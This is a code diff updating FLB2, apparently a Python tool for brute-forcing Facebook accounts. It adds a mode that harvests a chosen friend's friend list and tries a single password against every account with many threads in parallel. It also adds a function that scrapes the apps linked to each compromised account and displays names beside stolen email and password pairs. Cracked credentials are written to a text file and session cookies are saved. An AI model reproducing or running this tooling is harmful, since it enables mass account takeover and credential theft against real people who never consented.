@@ -11,8 +11,7 @@ from distutils.spawn import find_executable
 from multiprocessing import cpu_count , Process
 from multiprocessing.pool import ThreadPool 
   
-
-os.system("clear")
+if __name__ == "__main__": os.system("clear")
 
 W = '\x1b[1;37m'
 N = '\x1b[0m'
@@ -51,7 +50,7 @@ banner = f'''{Y}
  / __ \ \__/ / __ \   {W}UPDATED VERSION {R}(FIX){Y}
 / /  \ \____/ /  \ \   {W}    BY {Y}
 \ \__/ / __ \ \__/ /   {W} NASIR ALI{Y}
- \____/ /  \ \____/      {G}V {Y}1.3
+ \____/ /  \ \____/      {G}V {Y}1.4
  
 {Y} Github : {G}https://{W}github.com/nasirxo/flb2
 {Y} Facebook : {G}https://{W}fb.com/nasir.xo
@@ -91,12 +90,14 @@ if find_executable("flb2") == None or INPUT_ARG() == "INSTALL":
              os.system("cp flb2.py $HOME/../usr/bin/flb2")
              os.system("chmod +x $HOME/../usr/bin/flb2")
              print(f" {W}[{G}!{W}] {G} FLB2 INSTALLED SUCESSFULLY !")
+    """
     else:
          print(f" {W}[{R}!{W}] {G}REGULAR LINUX DETECTED !")
          if os.path.exists("flb2.py"):
              os.system("cp flb2.py /usr/bin/flb2")
              os.system("chmod +x /usr/bin/flb2")
-             print(f" {W}[{G}!{W}] {G} FLB2 INSTALLED SUCESSFULLY !")             
+             print(f" {W}[{G}!{W}] {G} FLB2 INSTALLED SUCESSFULLY !")  
+    """           
     print(f" {W}[{Y}!{W}] YOU CAN NOW RUN FLB2 BY {G}$FLB2")
 
 
@@ -1654,6 +1655,20 @@ class FB:
                'id':re.findall(r'\d+',x.a.get('href'))[0]
               };i+=1
     return data
+
+   def getmyapps(self,TYPE="active"):
+    APPS = []
+    r = self.s.get(self.url.format(f"/settings/apps/tabbed/?tab={TYPE}"))
+    html = bs(r.content,"html.parser")
+    try:
+      APPS_HTML = html.find("div",{"id":"appsSectionRoot"}).find("table",{'role':'presentation'})
+      for x in APPS_HTML.findAll("td"):
+          try: 
+            APP_NAME = x.span.get_text()
+            if APP_NAME not in APPS: APPS.append(APP_NAME)
+          except: pass
+    except: pass      
+    return APPS
    
    def getname(self):
      r = self.s.get(self.url.format('/profile.php'))
@@ -1721,6 +1736,7 @@ class CRACK_COUNTER:
        self.C = C
        self.T = T
        self.FF = 0
+       self.ACCOUNTS = {}
        
    def sucess(self,n=None):     
        if n==None: self.S+=1
@@ -1733,12 +1749,23 @@ class CRACK_COUNTER:
    def checkpoint(self,n=None): 
         if n==None: self.C+=1
         else: self.C = n
-
+        
    def progress(self):
       try:
        return round(((self.S+self.F+self.C)/self.T)*100.0,2)
       except:
        return 0.00
+       
+   def set_accounts(self,A):
+      self.ACCOUNTS = A
+      
+   def get_name_by_id(self,ID):
+      try:
+       for x in self.ACCOUNTS.keys():
+          try:
+           if self.ACCOUNTS[x]['id'] == ID: return self.ACCOUNTS[x]['name']
+          except: return ""
+      except: return ""
 
 C_C = CRACK_COUNTER()
 
@@ -1753,7 +1780,14 @@ def crack(email_pass):
    Q.set_password(password)
    Q_RES = Q.login(NEW=True)
    if len(Q.getaccountid()) > 2:
-      print(f" {G}[+]{W} {email} {G}|{W} {password} ")
+      ACC_NAME = C_C.get_name_by_id(Q.getaccountid())
+      print(f" {G}[+] {W}[{Y}{ACC_NAME}{W}] {G}->{W} {email} {G}|{W} {password} ")
+      MY_APPS_ACTIVE = Q.getmyapps('active')
+      MY_APPS_INACTIVE = Q.getmyapps('inactive')
+      if len(MY_APPS_ACTIVE) > 0:
+          print(f"{W} ===( {Y}ASSOCIATED APPS TO THIS ACCOUNT {W})=== ")
+          print(f"{G} ACTIVE : {Y}"," | ".join(MY_APPS_ACTIVE))
+          print(f"{R} EXPIRED : {Y}"," | ".join(MY_APPS_INACTIVE))
       C_C.sucess()
       Q.savecookie(f"{email}.cookie")
       with open("cracked_accounts.txt",'a') as C_A:
@@ -1878,12 +1912,13 @@ if __name__ == '__main__':
         {G}[2] GROUP MEMBERS BRUTEFORCE
         {G}[3] SEND MESSAGE TO ONLINE FRIENDS
         {G}[4] GENERATE FLB2 ACESS KEY
-        {G}[5] VIEW CRACKED ACCOUNTS        
+        {G}[5] VIEW CRACKED ACCOUNTS     
+        {G}[6] FRIEND FRIENDLIST BRUTE FORCE            
        {W}=============================
      """)   
    while True:
        INP = input(f"{W} [-] OPTION : {Y}")
-       if INP in list("12345"):
+       if INP in list("123456"):
          if INP == '1': 
             MENUE_MODE = 1
             print(f" {W}[{G}!{W}] {G}ACTIVATED FRIENDLIST BRUTEFORCE MODE")  
@@ -1909,6 +1944,10 @@ if __name__ == '__main__':
               CRACKED_ACCOUNTS = ""             
             print(f"\n  {W}=========( {G}CRACKED ACCOUNTS {W})======== \n") 
             print(CRACKED_ACCOUNTS)
+         if INP == '6': 
+            MENUE_MODE = 6
+            print(f" {W}[{G}!{W}] {G}ACTIVATED FRIEND FRIENDLIST BRUTEFORCE MODE")  
+            break
        else:
          print(f" {R}[!]{W} Invalid Option Selected ")       
 
@@ -1928,6 +1967,7 @@ if __name__ == '__main__':
      C_C.F = 0
      C_C.C = 0
      C_C.T = len(f.friends_ids.keys())
+     C_C.set_accounts(f.friends_ids)
      TRY_PASS =  input(f"{W} [-] PASSWORD TO TRY : {Y}")
      CRACK_LIST = []
      print(f"{G} [+] MAKING IDS/PASSWORD COMBINATION ...")
@@ -1944,6 +1984,39 @@ if __name__ == '__main__':
      print(f"\n\n{W} ===========({G}CRACKING{W})=============")
      TP.map(crack,CRACK_LIST)
      print(f"\n\n{W} ===========({G}FINISHED{W})=============\n\n")
+
+   while MENUE_MODE == 6:
+     C_C.S = 0
+     C_C.F = 0
+     C_C.C = 0
+     FRIEND_ID = input(f"{W} [{G}>{W}] FRIEND ID : {Y}")
+     print(f"{W} [{G}*{W}] {G}Getting Your Friend Friendlist ...")
+     try: 
+        FRIEND_FRIENDLIST = f.getfriends(FRIEND_ID)
+        C_C.T = len(FRIEND_FRIENDLIST.keys())
+        C_C.set_accounts(FRIEND_FRIENDLIST)
+     except: 
+        print(f"{W} [{R}!{W}] {R}Cant Fetch Your Friend Friendlist !")
+        C_C.T = 0
+     if C_C.T > 0: 
+      f.save_friend_ids(f"{FRIEND_ID}.ids")  
+      print(f"{W} [{G}*{W}] FETCHED {G}{C_C.T} {W}IDS ")
+      TRY_PASS =  input(f"{W} [-] PASSWORD TO TRY : {Y}")
+      CRACK_LIST = []
+      print(f"{G} [+] MAKING IDS/PASSWORD COMBINATION ...")
+      for W_L in FRIEND_FRIENDLIST.keys():
+       #time.sleep(0.001)
+       try:
+         crack_text = f"{FRIEND_FRIENDLIST[W_L]['id']}::{TRY_PASS}"
+         print(f"{Y} [*] Adding - {W}({FRIEND_FRIENDLIST[W_L]['id']})",end="\r")
+         CRACK_LIST.append(crack_text)
+       except: pass
+     
+      print(f"{G} [+] CRACKING IN MULTITHREAD MODE ...")
+      print(f"{G} [!] {Y}INFO : {W}if any account is cracked it will be shown below so be patient")
+      print(f"\n\n{W} ===========({G}CRACKING{W})=============")
+      TP.map(crack,CRACK_LIST)
+      print(f"\n\n{W} ===========({G}FINISHED{W})=============\n\n")
    
    if MENUE_MODE == 2: 
      while True:
@@ -1978,6 +2051,7 @@ if __name__ == '__main__':
      C_C.F = 0
      C_C.C = 0
      C_C.T = len(GROUP_IDS.keys())
+     C_C.set_accounts(GROUP_IDS)
      TRY_PASS =  input(f"{W} [-] PASSWORD TO TRY : {Y}")
      CRACK_LIST = []
      print(f"{G} [+] MAKING IDS/PASSWORD COMBINATION ...")
